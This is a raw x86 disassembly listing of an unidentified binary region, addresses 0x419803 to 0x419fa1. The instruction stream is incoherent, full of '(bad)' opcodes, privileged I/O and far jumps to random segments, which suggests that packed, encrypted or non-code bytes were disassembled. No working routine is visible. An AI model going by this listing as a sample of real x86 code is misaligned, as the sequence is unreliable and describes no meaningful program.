  419803:	ins    BYTE PTR es:[edi],dx
  419804:	mov    dl,0xa6
  419806:	push   ecx
  419807:	ins    DWORD PTR es:[edi],dx
  419808:	mov    esp,fs
  41980a:	int    0x96
  41980c:	lahf   
  41980d:	mov    dl,0x2a
  41980f:	push   edi
  419810:	(bad)  
  419811:	neg    cl
  419813:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419814:	pop    es
  419815:	dec    DWORD PTR [eax]
  419817:	(bad)  
  419819:	adc    eax,0x55d440d0
  41981e:	jmp    DWORD PTR [edi]
  419820:	outs   dx,DWORD PTR ds:[esi]
  419821:	jecxz  0x419877
  419823:	scas   al,BYTE PTR es:[edi]
  419824:	push   esp
  419825:	inc    eax
  419826:	(bad)  
  419828:	sbb    DWORD PTR [ecx],edx
  41982a:	xchg   esp,eax
  41982b:	jle    0x41989d
  41982d:	or     BYTE PTR [edx],bl
  41982f:	cmp    eax,ebx
  419831:	sar    DWORD PTR [ebx],cl
  419833:	pop    ds
  419834:	rol    edx,1
  419836:	fstp   DWORD PTR [edi-0x61]
  419839:	inc    ecx
  41983a:	ret    
  41983b:	mov    BYTE PTR [edi+0x408fb33b],ah
  419841:	lods   eax,DWORD PTR ds:[esi]
  419842:	cld    
  419843:	push   eax
  419844:	inc    ebp
  419845:	sub    esi,0xffffffff
  419848:	aad    0xd2
  41984a:	inc    ebp
  41984b:	adc    eax,0x579f7484
  419850:	(bad)  
  419851:	pop    ecx
  419852:	jne    0x419863
  419854:	or     al,0x6a
  419856:	mov    bh,0x74
  419858:	mov    ds:0xa1f85479,al
  41985d:	mov    al,0xe5
  41985f:	inc    esi
  419860:	test   al,0x11
  419862:	pop    edx
  419863:	pop    sp
  419865:	mov    esi,0x7e4db494
  41986a:	hlt    
  41986b:	jle    0x419867
  41986d:	inc    eax
  41986e:	aas    
  41986f:	repz arpl WORD PTR [ecx],cx
  419872:	xchg   edx,eax
  419873:	push   eax
  419874:	xchg   ebp,eax
  419875:	add    al,0xd5
  419877:	inc    edi
  419878:	mov    esi,0x74b65528
  41987d:	and    al,0xf8
  41987f:	push   es
  419880:	ret    
  419881:	dec    esp
  419882:	sti    
  419883:	or     DWORD PTR [edx+0x3b6b10],ecx
  419889:	sub    BYTE PTR [ebx-0x38b69d96],cl
  41988f:	jbe    0x419843
  419891:	add    al,al
  419893:	outs   dx,DWORD PTR ds:[esi]
  419894:	mov    esp,0xb11d59a6
  419899:	or     al,0x66
  41989b:	shr    DWORD PTR [edi+0x16],1
  41989e:	in     al,0xa5
  4198a0:	stc    
  4198a1:	jae    0x4198e3
  4198a3:	inc    esi
  4198a4:	pop    edx
  4198a5:	adc    BYTE PTR [eax+0x38],dh
  4198a8:	in     al,dx
  4198a9:	add    eax,0x59a7ecdf
  4198ae:	icebp  
  4198af:	sub    al,0x98
  4198b1:	hlt    
  4198b2:	or     bl,cl
  4198b4:	push   esi
  4198b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198b6:	xchg   DWORD PTR [bx+di-0x4a4a],ebp
  4198bb:	fwait
  4198bc:	es scas al,BYTE PTR es:[edi]
  4198be:	mov    ch,0x7d
  4198c0:	les    edx,FWORD PTR [ecx*2+0x1c547c1a]
  4198c7:	mov    ah,ch
  4198c9:	retf   0x3187
  4198cc:	mov    edx,0x3d93d0a9
  4198d1:	repnz aaa 
  4198d3:	ret    0x123a
  4198d6:	add    dl,BYTE PTR [ebp-0x33]
  4198d9:	mov    edx,ebp
  4198db:	fwait
  4198dc:	gs jecxz 0x419955
  4198df:	dec    eax
  4198e0:	nop
  4198e1:	pop    esi
  4198e2:	lahf   
  4198e3:	jecxz  0x4198f0
  4198e5:	lock xor al,0x6d
  4198e8:	mov    ds,WORD PTR [eax+0x15]
  4198eb:	xchg   BYTE PTR [ecx+ecx*2-0x78b29e34],cl
  4198f2:	cld    
  4198f3:	mov    cl,0x3e
  4198f5:	or     eax,0x95a3e684
  4198fa:	adc    al,0xb1
  4198fc:	out    0xc2,eax
  4198fe:	and    DWORD PTR [ecx],eax
  419900:	out    dx,al
  419901:	stos   DWORD PTR es:[edi],eax
  419902:	stos   DWORD PTR es:[edi],eax
  419903:	inc    edi
  419904:	pop    ds
  419905:	or     DWORD PTR [eax],eax
  419907:	ret    
  419908:	push   edx
  419909:	(bad)  
  41990a:	and    edi,DWORD PTR [ecx+0x3dd79380]
  419910:	push   es
  419911:	dec    ecx
  419912:	int    0xc
  419914:	lea    ebp,[eax]
  419916:	lods   al,BYTE PTR ds:[esi]
  419917:	scas   al,BYTE PTR es:[edi]
  419918:	test   BYTE PTR [ebx-0x6],ch
  41991b:	and    DWORD PTR [edi+0x17],esp
  41991e:	das    
  41991f:	lds    edi,FWORD PTR [ebx+0x47]
  419922:	or     edi,esi
  419924:	cli    
  419925:	retf   0xf62
  419928:	outs   dx,DWORD PTR ds:[esi]
  419929:	aam    0x0
  41992b:	push   edx
  41992c:	add    al,0x64
  41992e:	xor    DWORD PTR ds:0xbea08461,esp
  419934:	(bad)  
  419935:	xor    ecx,ebx
  419937:	ja     0x419998
  419939:	mov    ecx,0x89a4d543
  41993e:	sbb    eax,0x41fa7c56
  419943:	mov    bh,0xc9
  419945:	xchg   ebx,eax
  419946:	aad    0x62
  419948:	sar    BYTE PTR [ecx+eiz*2+0x21cc8b3e],0x45
  419950:	add    edi,DWORD PTR [ebx]
  419952:	mov    ds:0xeed6f039,al
  419957:	xchg   edx,eax
  419958:	mov    ds:0x6e2809d0,al
  41995d:	les    esi,FWORD PTR [ebp+0x6adbb599]
  419963:	cmp    DWORD PTR [eax+eax*2-0x5f6385e9],edi
  41996a:	xchg   DWORD PTR [ecx+eax*8],ecx
  41996d:	in     eax,0xad
  41996f:	fsubr  DWORD PTR [eax-0x7b636115]
  419975:	ror    BYTE PTR [edx-0x47],0x93
  419979:	add    dh,BYTE PTR [ebp-0x50]
  41997c:	cmp    eax,0x71a9957a
  419981:	inc    eax
  419982:	mov    ecx,edi
  419984:	adc    eax,0x30acc748
  419989:	shr    BYTE PTR [eax-0x65],0xa
  41998d:	mov    bl,0x8f
  41998f:	push   ss
  419990:	xor    DWORD PTR ds:0x40b01e78,ecx
  419996:	jl     0x41997d
  419998:	repz xchg ecx,eax
  41999a:	pushf  
  41999b:	xchg   esi,eax
  41999c:	fnstenv [eax-0x2d2301e2]
  4199a2:	jne    0x4199f2
  4199a4:	cmp    DWORD PTR [edx-0x24c1edf6],edx
  4199aa:	mov    ecx,0xc23e1d71
  4199af:	pop    edi
  4199b0:	mov    ebx,0xccc4832a
  4199b5:	test   DWORD PTR [eax-0x11163a1a],edx
  4199bb:	fwait
  4199bc:	addr16 mov ebx,0xfd5b5a6f
  4199c2:	sub    bh,BYTE PTR [ebx]
  4199c4:	fdivr  QWORD PTR [ebp-0x17d94eba]
  4199ca:	int    0xe1
  4199cc:	hlt    
  4199cd:	mov    DWORD PTR [edx],eax
  4199cf:	test   eax,0xb95bcb5e
  4199d4:	xor    ebp,DWORD PTR [eax-0x18414907]
  4199da:	sti    
  4199db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199dc:	and    al,0x86
  4199de:	jbe    0x4199af
  4199e0:	enclu  
  4199e3:	leave  
  4199e4:	jl     0x4199c6
  4199e6:	inc    esi
  4199e7:	imul   BYTE PTR [esi]
  4199e9:	pushf  
  4199ea:	add    DWORD PTR [eax-0x7541e0b4],edi
  4199f0:	jnp    0x419994
  4199f2:	or     ah,BYTE PTR [edi+0x4e34717e]
  4199f8:	popa   
  4199f9:	cwde   
  4199fa:	out    dx,eax
  4199fb:	mov    ecx,0x58b9e858
  419a00:	and    eax,0x51b4307f
  419a05:	test   al,0xe0
  419a07:	lods   al,BYTE PTR ds:[esi]
  419a08:	xchg   ebx,eax
  419a09:	dec    esp
  419a0a:	mov    ds:0xf0b17d74,al
  419a0f:	push   esi
  419a10:	loop   0x4199c3
  419a12:	push   esi
  419a13:	push   DWORD PTR [edi]
  419a15:	outs   dx,DWORD PTR ds:[esi]
  419a16:	iret   
  419a17:	std    
  419a18:	mov    al,ds:0x3ff6b82f
  419a1e:	ds cs in eax,0xa2
  419a22:	dec    ebx
  419a23:	pop    es
  419a24:	ins    BYTE PTR es:[edi],dx
  419a25:	jae    0x419a3d
  419a27:	cmp    BYTE PTR [ecx+0x206acd33],bl
  419a2d:	mov    ds:0xfe3a4901,al
  419a32:	lds    edx,FWORD PTR ds:0xcd83628a
  419a38:	ss mov ebp,0x7a69ef92
  419a3e:	shl    BYTE PTR [edi-0x42],0x1a
  419a42:	cwde   
  419a43:	bound  esi,QWORD PTR [ecx+0x3f53b150]
  419a49:	pop    ecx
  419a4a:	pop    edi
  419a4b:	jae    0x4199f9
  419a4d:	mov    eax,ds:0x7149d0d2
  419a53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a54:	ins    BYTE PTR es:[edi],dx
  419a55:	test   BYTE PTR [ebp+0x41934eea],dh
  419a5b:	addr16 out 0x1e,eax
  419a5e:	scas   al,BYTE PTR es:[edi]
  419a5f:	lahf   
  419a60:	sahf   
  419a61:	mov    ch,0x79
  419a63:	push   es
  419a64:	dec    esp
  419a65:	pop    esp
  419a66:	mov    WORD PTR [eax+0x49],ds
  419a69:	jmp    0x419a16
  419a6b:	jge    0x419a9e
  419a6d:	and    dh,BYTE PTR [eax+edx*4+0x1]
  419a71:	aas    
  419a72:	test   BYTE PTR [ecx+0x756da0b4],dl
  419a78:	mov    edi,0xf4173aa3
  419a7d:	mov    bl,BYTE PTR [ebp+0x64]
  419a80:	mov    bl,0x11
  419a82:	ja     0x419ad3
  419a84:	mov    eax,0xc615e74b
  419a89:	mov    ecx,ebp
  419a8b:	push   ecx
  419a8c:	loop   0x419aa3
  419a8e:	dec    eax
  419a8f:	push   eax
  419a90:	pop    ecx
  419a91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a92:	ja     0x419a90
  419a94:	aam    0x46
  419a96:	cdq    
  419a97:	rol    DWORD PTR ds:[esi+0x2a432546],0x1c
  419a9f:	sub    ecx,DWORD PTR [ebx+0x726534a7]
  419aa5:	add    BYTE PTR [edi+0x15785ae1],al
  419aab:	scas   al,BYTE PTR es:[edi]
  419aac:	and    BYTE PTR [eax-0x3b],dh
  419aaf:	out    0x99,eax
  419ab1:	dec    BYTE PTR [eax+ebx*2-0x1970bea6]
  419ab8:	mov    eax,0x82c33aa6
  419abd:	mov    cl,0x57
  419abf:	adc    DWORD PTR [edi],0x4477c662
  419ac5:	fsubr  DWORD PTR [esi-0x6b]
  419ac8:	ja     0x419b11
  419aca:	inc    edx
  419acb:	out    dx,eax
  419acc:	inc    esi
  419acd:	(bad)  
  419ace:	shl    cl,cl
  419ad0:	jl     0x419aef
  419ad2:	fdiv   QWORD PTR [esi]
  419ad4:	pop    esi
  419ad5:	pop    ebp
  419ad6:	dec    esp
  419ad7:	push   cs
  419ad8:	aad    0x58
  419ada:	sub    al,0xae
  419adc:	jmp    0x4855e1a5
  419ae1:	push   eax
  419ae2:	xchg   ebx,eax
  419ae3:	pop    edi
  419ae4:	inc    esp
  419ae5:	shl    BYTE PTR [ecx+0x71939292],0x97
  419aec:	ds xchg ecx,esi
  419aef:	std    
  419af0:	inc    edx
  419af1:	jmp    0x419acb
  419af3:	add    al,cl
  419af5:	mov    ecx,0x903b7ec
  419afa:	push   ebp
  419afb:	add    edi,ebp
  419afd:	jp     0x419a8d
  419aff:	push   0x3f3f6ead
  419b04:	xor    ebx,DWORD PTR [ebp+0x7b]
  419b07:	daa    
  419b08:	dec    edx
  419b09:	cmp    esi,esi
  419b0b:	shl    bh,0xb5
  419b0e:	outs   dx,DWORD PTR ds:[esi]
  419b0f:	add    DWORD PTR [edi+ebx*1-0x5b42cc1b],esi
  419b16:	adc    BYTE PTR [ebx-0x1132c665],ah
  419b1c:	popa   
  419b1d:	inc    ecx
  419b1e:	jecxz  0x419b2a
  419b20:	sub    edx,ebx
  419b22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b23:	(bad)  
  419b24:	jnp    0x419b2f
  419b26:	iret   
  419b27:	mov    ebp,0x2a3465f3
  419b2c:	push   ebx
  419b2d:	fxtract 
  419b2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b30:	retf   0xc0e9
  419b33:	inc    ecx
  419b34:	push   ecx
  419b35:	or     dl,BYTE PTR [esi]
  419b37:	iret   
  419b38:	cmp    ch,bl
  419b3a:	add    ebp,eax
  419b3c:	ins    BYTE PTR es:[edi],dx
  419b3d:	popf   
  419b3e:	adc    bh,ah
  419b40:	int    0x81
  419b42:	mov    ch,BYTE PTR [ebx+0x3ca384f2]
  419b48:	pop    eax
  419b49:	and    cl,al
  419b4b:	add    esp,DWORD PTR [edi-0x72eb56c3]
  419b51:	lods   eax,DWORD PTR ds:[esi]
  419b52:	pushf  
  419b53:	xor    eax,0x6d20fb74
  419b58:	and    cl,dh
  419b5a:	icebp  
  419b5b:	(bad)  
  419b5c:	loope  0x419af1
  419b5e:	sub    BYTE PTR [edx-0x45],bh
  419b61:	sbb    eax,0xdabd734b
  419b66:	sbb    esp,eax
  419b68:	in     al,dx
  419b69:	mov    DWORD PTR gs:[ecx],esp
  419b6c:	or     DWORD PTR [esi],edx
  419b6e:	adc    al,0x3
  419b70:	ret    
  419b71:	adc    DWORD PTR [ecx-0x3],0x71a5d2ff
  419b78:	popf   
  419b79:	cwde   
  419b7a:	bnd jb 0x419aff
  419b7d:	cld    
  419b7e:	mov    ebp,0xcbae4676
  419b83:	sbb    DWORD PTR [ebp+esi*1+0x2b55f087],ebp
  419b8a:	sub    BYTE PTR [esi-0x2ba4571f],ah
  419b90:	lods   eax,DWORD PTR ds:[esi]
  419b91:	xor    BYTE PTR [eax],cl
  419b93:	mov    ds,WORD PTR [esi]
  419b95:	sub    eax,0xaec682ee
  419b9a:	jne    0x419b84
  419b9c:	std    
  419b9d:	out    0x73,eax
  419b9f:	std    
  419ba0:	xor    eax,0xf5b4823c
  419ba5:	mov    al,ds:0xe9d6a925
  419baa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bab:	mov    ?,WORD PTR [ebx]
  419bad:	jnp    0x419c2d
  419baf:	push   ebp
  419bb0:	jo     0x419c17
  419bb2:	inc    edx
  419bb3:	adc    BYTE PTR ds:0x7a0a34fd,ch
  419bb9:	ss mov bl,0x67
  419bbc:	and    bh,ch
  419bbe:	push   eax
  419bbf:	(bad)  
  419bc1:	inc    edx
  419bc2:	popf   
  419bc3:	push   0x6aa59a2d
  419bc8:	scas   eax,DWORD PTR es:[edi]
  419bc9:	test   eax,0xeb9fdb77
  419bce:	cld    
  419bcf:	add    ah,BYTE PTR [ebp+0x4f]
  419bd2:	fwait
  419bd3:	sbb    al,0x68
  419bd5:	daa    
  419bd6:	cdq    
  419bd7:	mov    al,0x1d
  419bd9:	iret   
  419bda:	pop    ss
  419bdb:	mov    DWORD PTR [ecx+0x510b4b32],edi
  419be1:	inc    edi
  419be2:	stos   BYTE PTR es:[edi],al
  419be3:	jge    0x419bf9
  419be5:	inc    edx
  419be6:	xor    al,0xfd
  419be8:	xor    edx,DWORD PTR [esi+0x29]
  419beb:	adc    eax,0xbc105543
  419bf0:	cmp    BYTE PTR [eax+edx*8],al
  419bf3:	out    dx,eax
  419bf4:	push   ebp
  419bf5:	js     0x419c75
  419bf7:	adc    eax,0x71f4e98c
  419bfc:	push   ecx
  419bfd:	jg     0x419ba6
  419bff:	retw   0x79b8
  419c03:	popa   
  419c04:	and    al,0xfa
  419c06:	int    0xad
  419c08:	pop    edi
  419c09:	add    eax,0x4e4a0e79
  419c0e:	mov    bl,0x36
  419c10:	mov    ch,0xa9
  419c12:	sub    al,0xdb
  419c14:	out    0x4f,al
  419c16:	pop    esp
  419c17:	add    al,0x64
  419c19:	dec    esp
  419c1a:	sub    eax,0xa1c3938f
  419c1f:	jnp    0x419bbf
  419c21:	rcr    BYTE PTR [eax],1
  419c23:	aad    0x8a
  419c25:	dec    edx
  419c26:	out    0x7,al
  419c28:	sub    bh,dl
  419c2a:	fmul   st,st(3)
  419c2c:	js     0x419bdb
  419c2e:	int    0x67
  419c30:	cmp    DWORD PTR [ebp+0x1ab197d6],ebx
  419c36:	call   0xc819:0xb0bed40b
  419c3d:	lea    esp,[ebx]
  419c3f:	icebp  
  419c40:	mov    es,WORD PTR [ebx+0x18e8137a]
  419c46:	mov    al,ds:0x5bf928cd
  419c4b:	inc    ebp
  419c4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c4d:	adc    ebp,DWORD PTR [edi+0x21]
  419c50:	jae    0x419bd6
  419c52:	pop    esi
  419c53:	lea    ecx,[ebp+0x1a470a9d]
  419c59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c5a:	icebp  
  419c5b:	(bad)  
  419c5c:	fild   DWORD PTR [edi+eax*2+0x7d017bba]
  419c63:	xor    ecx,DWORD PTR ds:0x744fdb96
  419c69:	xchg   DWORD PTR [ebx],edx
  419c6b:	ja     0x419c1a
  419c6d:	loopne 0x419cb9
  419c6f:	xlat   BYTE PTR ds:[ebx]
  419c70:	fisub  DWORD PTR [edi+0x77]
  419c73:	jbe    0x419c6a
  419c75:	ja     0x419c33
  419c77:	push   ecx
  419c78:	mov    ecx,0x23fce1a4
  419c7d:	mov    bh,0x9b
  419c7f:	add    eax,0xf71ed2d7
  419c84:	fcmovu st,st(0)
  419c86:	sahf   
  419c87:	repnz call 0xa3c1:0xa76acfaf
  419c8f:	xchg   BYTE PTR [ebp-0x5e],cl
  419c92:	enter  0x9cb,0xf3
  419c96:	add    edx,DWORD PTR [ebp+0x4ae06052]
  419c9c:	xchg   ebp,eax
  419c9d:	xchg   ebx,eax
  419c9e:	sti    
  419c9f:	add    BYTE PTR [ebp+0x2],0x13
  419ca3:	popf   
  419ca4:	jo     0x419cea
  419ca6:	sub    BYTE PTR [ebx],ah
  419ca8:	jne    0x419cee
  419caa:	js     0x419c69
  419cac:	xor    edx,edi
  419cae:	cmp    ecx,edx
  419cb0:	out    dx,al
  419cb1:	sar    eax,1
  419cb3:	xchg   ecx,eax
  419cb4:	icebp  
  419cb5:	fild   WORD PTR [ebx+ecx*4-0x1e]
  419cb9:	mov    bh,0x0
  419cbb:	test   DWORD PTR [eax-0x5a1e7c72],ebx
  419cc1:	sub    BYTE PTR [ecx],0xf
  419cc4:	out    0xf3,al
  419cc6:	retf   0x5826
  419cc9:	push   esi
  419cca:	stc    
  419ccb:	int    0x9a
  419ccd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cce:	rcl    BYTE PTR [edx],cl
  419cd0:	jmp    0xcf8d:0xf7cc694
  419cd7:	rcl    bh,1
  419cd9:	pop    ds
  419cda:	nop
  419cdb:	xor    eax,0x573a9543
  419ce0:	iret   
  419ce1:	mov    al,0xaa
  419ce3:	out    0xa8,eax
  419ce5:	outs   dx,BYTE PTR ds:[esi]
  419ce6:	sub    BYTE PTR [ecx-0x549f8a21],bh
  419cec:	cmp    ebx,DWORD PTR [eax+0x20215175]
  419cf2:	sbb    dh,BYTE PTR [ebp+ebp*4+0x48f30ec2]
  419cf9:	push   ecx
  419cfa:	repz mov ecx,0xc33c2803
  419d00:	(bad)  
  419d01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d02:	lods   al,BYTE PTR ds:[esi]
  419d03:	loope  0x419cb8
  419d05:	fadd   DWORD PTR [ecx]
  419d07:	psrlq  mm6,QWORD PTR [ebp-0x1f7fd303]
  419d0e:	inc    esi
  419d0f:	mov    esi,0xc39b4397
  419d14:	mov    eax,ds:0x76ca9492
  419d19:	push   ds
  419d1a:	rol    BYTE PTR [edx-0x17],cl
  419d1d:	retf   
  419d1e:	lahf   
  419d1f:	nop
  419d20:	adc    al,0x9b
  419d22:	jnp    0x419cee
  419d24:	in     al,0x72
  419d26:	sbb    al,0xc6
  419d28:	fidiv  DWORD PTR [edi+ebx*2+0x68]
  419d2c:	les    ecx,FWORD PTR [eax]
  419d2e:	mov    ds:0x489986fc,al
  419d33:	adc    ch,BYTE PTR [edi+0xf]
  419d36:	test   al,0xe1
  419d38:	adc    DWORD PTR [ebx+0x19799d2f],eax
  419d3e:	les    esi,FWORD PTR [ecx+0x621e23d7]
  419d44:	out    0xe0,eax
  419d46:	js     0x419d5d
  419d48:	or     DWORD PTR [eax],esp
  419d4a:	mov    ch,0xce
  419d4c:	cmp    al,0x9d
  419d4e:	int3   
  419d4f:	mov    edi,0x8ee096
  419d54:	imul   BYTE PTR [ebp-0x14]
  419d57:	sahf   
  419d58:	inc    ebp
  419d59:	inc    ecx
  419d5a:	add    eax,0x73f869b5
  419d5f:	ret    0x65fd
  419d62:	push   ebp
  419d63:	mov    eax,0x59a82616
  419d68:	or     esp,DWORD PTR [edx]
  419d6a:	loop   0x419d2f
  419d6c:	dec    ecx
  419d6d:	(bad)  
  419d6f:	rol    DWORD PTR [esp+eiz*8+0x4ddd7a0e],0xc
  419d77:	(bad)  
  419d79:	mov    edi,0x86462fdd
  419d7e:	call   0x57cb:0xc6fc4c6e
  419d85:	inc    edi
  419d86:	push   es
  419d87:	stos   DWORD PTR es:[edi],eax
  419d88:	mov    edx,0xa5d9fd24
  419d8d:	xchg   edi,eax
  419d8e:	jmp    0x419ddc
  419d90:	outs   dx,BYTE PTR ds:[esi]
  419d91:	xchg   ebx,eax
  419d92:	cwde   
  419d93:	push   ds
  419d94:	scas   al,BYTE PTR es:[edi]
  419d95:	das    
  419d96:	fistp  DWORD PTR [eax+0x79]
  419d99:	push   ecx
  419d9a:	out    dx,eax
  419d9b:	(bad)
  419d9e:	xor    ah,0xf4
  419da1:	xor    DWORD PTR [esi],ebp
  419da3:	imul   esp,DWORD PTR [ebx+0x7b45599c],0x1f85bee9
  419dad:	or     eax,0x89b8a061
  419db2:	sbb    DWORD PTR ds:0xda2e3a7b,0xffffffac
  419db9:	in     eax,dx
  419dba:	or     al,0x95
  419dbc:	cmp    BYTE PTR [ebx],ch
  419dbe:	xor    bh,al
  419dc0:	pop    eax
  419dc1:	std    
  419dc2:	(bad)  
  419dc3:	cs aaa 
  419dc5:	pusha  
  419dc6:	inc    edi
  419dc7:	inc    esi
  419dc8:	mov    ch,0x53
  419dca:	adc    BYTE PTR [ecx-0x2ea12bc6],cl
  419dd0:	fs push edx
  419dd2:	mov    al,ds:0xd2b2e656
  419dd7:	lahf   
  419dd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419dd9:	cmp    DWORD PTR [ebx-0x31],esp
  419ddc:	lods   al,BYTE PTR ds:[esi]
  419ddd:	adc    esi,DWORD PTR [edi]
  419ddf:	sbb    BYTE PTR [edi+0x5498a117],0x87
  419de6:	mov    eax,0xb313ea89
  419deb:	cmp    DWORD PTR [ebx+eax*4],esp
  419dee:	ficom  DWORD PTR [esi+ecx*8-0x71defa92]
  419df5:	sbb    bl,BYTE PTR [edi-0x7504cfb6]
  419dfb:	cmp    BYTE PTR ds:0xb1f7646a,bh
  419e01:	jmp    0x8d5a:0x848f72de
  419e08:	cli    
  419e09:	int    0x2d
  419e0b:	ja     0x419d97
  419e0d:	ins    DWORD PTR es:[edi],dx
  419e0e:	mov    dh,0xda
  419e11:	and    ebx,DWORD PTR [esi+esi*2]
  419e14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e16:	pushf  
  419e17:	mov    dl,BYTE PTR [ecx+0x472fc062]
  419e1d:	fild   DWORD PTR [ebx+ecx*8+0x65]
  419e21:	cmp    BYTE PTR [edx],dh
  419e23:	and    eax,0x617b2fa3
  419e28:	sub    dl,BYTE PTR [ebp+0x2506ae40]
  419e2e:	outs   dx,DWORD PTR ds:[esi]
  419e2f:	mov    dh,0xbf
  419e31:	lahf   
  419e32:	lahf   
  419e33:	mov    WORD PTR [eax],gs
  419e35:	mov    ecx,0x6293233f
  419e3a:	cli    
  419e3b:	ja     0x419e5b
  419e3d:	sbb    esi,ebp
  419e3f:	xor    al,0x3d
  419e41:	in     eax,0xed
  419e43:	mov    al,0x10
  419e45:	inc    eax
  419e46:	fist   DWORD PTR [ebp+0x14]
  419e49:	inc    esi
  419e4a:	sub    esp,esi
  419e4c:	rol    DWORD PTR [ebp+edi*2-0x4ec20662],cl
  419e53:	and    ecx,0x55
  419e56:	fimul  WORD PTR [edi]
  419e58:	xchg   BYTE PTR ds:0x684fa256,dl
  419e5e:	dec    ebx
  419e5f:	ins    DWORD PTR es:[edi],dx
  419e60:	jno    0x419e90
  419e62:	inc    ecx
  419e63:	xchg   esi,eax
  419e64:	cdq    
  419e65:	jg     0xd0622168
  419e6b:	and    eax,0xdd2e9b7d
  419e70:	cmp    DWORD PTR [ebp-0x31bad346],esp
  419e76:	mov    ah,0xa1
  419e78:	xlat   BYTE PTR ds:[ebx]
  419e79:	in     al,dx
  419e7a:	xchg   ecx,eax
  419e7b:	xchg   esp,eax
  419e7c:	or     eax,DWORD PTR [ecx-0x1c]
  419e7f:	xchg   esi,eax
  419e80:	(bad)  
  419e81:	sub    DWORD PTR [edx+0x6],ecx
  419e84:	xchg   ebx,eax
  419e85:	jp     0x419eb7
  419e87:	pop    edx
  419e88:	adc    DWORD PTR [ebp-0x12c5321a],eax
  419e8e:	xor    eax,0xf1faf7f7
  419e93:	stc    
  419e94:	cmp    edi,DWORD PTR [ecx+0x3ad0bfff]
  419e9a:	inc    ebx
  419e9b:	adc    bh,bh
  419e9d:	shl    esp,1
  419e9f:	sahf   
  419ea0:	dec    BYTE PTR [ecx]
  419ea2:	adc    esp,DWORD PTR [ebx+0x53507d26]
  419ea8:	loopne 0x419e8c
  419eaa:	dec    esi
  419eab:	scas   eax,DWORD PTR es:[edi]
  419eac:	rcl    esi,0x87
  419eaf:	cmp    dl,bh
  419eb1:	das    
  419eb2:	sti    
  419eb3:	cmc    
  419eb4:	xor    eax,0xed5c4ae9
  419eb9:	std    
  419eba:	scas   al,BYTE PTR es:[edi]
  419ebb:	or     DWORD PTR [esi-0x65f73b67],esi
  419ec1:	xchg   ecx,eax
  419ec2:	mov    eax,ds:0x47391abb
  419ec7:	jmp    0x419f03
  419ec9:	and    DWORD PTR [ebp+0x64c75e60],edx
  419ecf:	test   eax,0xd51f269e
  419ed4:	cmc    
  419ed5:	stc    
  419ed6:	stos   DWORD PTR es:[edi],eax
  419ed7:	lock dec edi
  419ed9:	pushf  
  419eda:	and    dl,BYTE PTR [esi+0x4]
  419edd:	jecxz  0x419eb9
  419edf:	inc    edx
  419ee0:	fs (bad) 
  419ee2:	jg     0x419efe
  419ee4:	pop    esp
  419ee5:	cs dec esp
  419ee7:	and    al,0xf5
  419ee9:	mov    al,ds:0xa1c42584
  419eee:	jae    0x419f6b
  419ef0:	lods   al,BYTE PTR ds:[esi]
  419ef1:	hlt    
  419ef2:	popa   
  419ef3:	lea    ebx,[ebx-0x3d]
  419ef6:	or     ah,BYTE PTR [edi+0x6b873f64]
  419efc:	and    eax,0x5cfa5a98
  419f01:	push   ebp
  419f02:	inc    eax
  419f03:	(bad)  
  419f04:	mov    ebx,0x582a8948
  419f09:	xchg   ecx,eax
  419f0a:	dec    edx
  419f0b:	add    eax,0xa692d9e0
  419f10:	jae    0x419f0d
  419f12:	inc    BYTE PTR [ebx+0x2a]
  419f15:	lods   al,BYTE PTR ds:[esi]
  419f16:	cmovae ebp,edi
  419f19:	retf   
  419f1a:	std    
  419f1b:	arpl   WORD PTR [ebp-0x136544ec],sp
  419f21:	mov    ah,0xb1
  419f23:	outs   dx,BYTE PTR ds:[esi]
  419f24:	add    eax,0x857031b
  419f29:	add    BYTE PTR [ebx],dl
  419f2b:	xchg   esp,eax
  419f2c:	rcr    BYTE PTR [ebp+0x5ce6965d],1
  419f32:	cmp    al,0xe9
  419f34:	test   DWORD PTR [edx+ebp*1-0x7f],esp
  419f38:	inc    edi
  419f39:	cmp    eax,0xc3016873
  419f3e:	jae    0x419fb2
  419f40:	xchg   edi,eax
  419f41:	loope  0x419edf
  419f43:	push   edx
  419f44:	xchg   ecx,eax
  419f45:	inc    eax
  419f46:	mov    cl,0xc0
  419f48:	gs ins BYTE PTR es:[edi],dx
  419f4a:	cmp    DWORD PTR [edx],ebx
  419f4c:	mov    ebx,0xb3662603
  419f51:	ret    0x6e2d
  419f54:	sub    eax,0xd86688f2
  419f59:	sahf   
  419f5a:	xor    DWORD PTR [edi-0xe],0xffffffbd
  419f5e:	dec    esp
  419f5f:	pop    es
  419f60:	pushf  
  419f61:	dec    ebp
  419f62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f63:	xchg   ebp,eax
  419f64:	div    ebp
  419f66:	sbb    DWORD PTR [edx+0x949d3b],edi
  419f6c:	js     0x419fd1
  419f6e:	cs push 0x32a5e8e5
  419f74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f75:	cdq    
  419f76:	mov    cl,0x62
  419f78:	xchg   edi,eax
  419f79:	mov    edi,0xa3cfcf43
  419f7e:	dec    edi
  419f7f:	push   edi
  419f80:	rcr    BYTE PTR [ecx+edx*1+0x74],1
  419f84:	xor    eax,0xb380948f
  419f89:	pop    edx
  419f8a:	daa    
  419f8b:	arpl   ax,bp
  419f8d:	xor    BYTE PTR [eax],bl
  419f8f:	hlt    
  419f90:	push   ebx
  419f91:	adc    eax,0x6da4f377
  419f96:	pop    esp
  419f97:	mov    DWORD PTR [eax+ebp*2+0x2a],0x89e3c381
  419f9f:	stc    
  419fa0:	scas   eax,DWORD PTR es:[edi]
  419fa1:	jmp    0x419fdd
